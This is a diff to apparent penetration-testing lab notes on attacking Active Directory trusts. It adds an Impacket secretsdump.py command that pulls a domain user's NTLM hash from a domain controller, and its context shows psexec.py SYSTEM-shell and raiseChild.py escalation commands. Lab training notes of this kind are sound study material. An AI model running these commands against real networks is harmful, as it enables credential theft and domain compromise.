@@ -34,6 +34,11 @@ export KRB5CCNAME=hacker.ccache
 ```
 - Have to point to ccache file
 
+**Get NTLM hash of a domain user
+```
+secretsdump.py logistics.inlanefreight.local/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 -just-dc-user INLANEFREIGHT/bross
+```
+
 **Getting a SYSTEM shell using Impacket's psexec.py
 ```
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
@@ -43,6 +48,3 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 ```
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
-
-
-
